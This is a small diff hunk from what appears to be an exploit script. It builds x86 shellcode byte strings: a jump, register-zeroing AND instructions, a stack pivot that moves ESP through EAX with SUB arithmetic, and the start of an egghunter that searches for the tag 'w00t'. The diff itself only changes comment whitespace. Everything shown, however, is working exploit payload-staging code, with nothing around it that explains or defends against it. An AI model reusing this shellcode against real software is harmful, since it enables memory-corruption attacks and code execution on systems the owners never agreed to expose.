@@ -18,12 +18,12 @@ firstJump = "\x4c\x4c\x77\x04" 		# DEC ESP, DEC ESP, JA 04
 setStack = "\x25\x4A\x4D\x4E\x55" 	# AND EAX, 0x554E4D4A
 setStack += "\x25\x35\x32\x31\x2A" 	# AND EAX, 0x2A313235
 ### Save ESP to EAX ###
-setStack += "\x54\x58" 				# PUSH ESP, POP EAX
+setStack += "\x54\x58" 			# PUSH ESP, POP EAX
 ### Underflow ESP to desired value ###
 setStack += "\x2D\x35\x65\x55\x55" 	# SUB EAX, 0x55556535
 setStack += "\x2D\x35\x65\x55\x55" 	# SUB EAX, 0x55556535
 setStack += "\x2D\x0C\x18\x54\x55" 	# SUB EAX, 0x5554180C
-setStack += "\x50\x5C" 				# PUSH EAX, POP ESP
+setStack += "\x50\x5C" 			# PUSH EAX, POP ESP
 
 ### Egg is w00t ###
 egghunter = ""
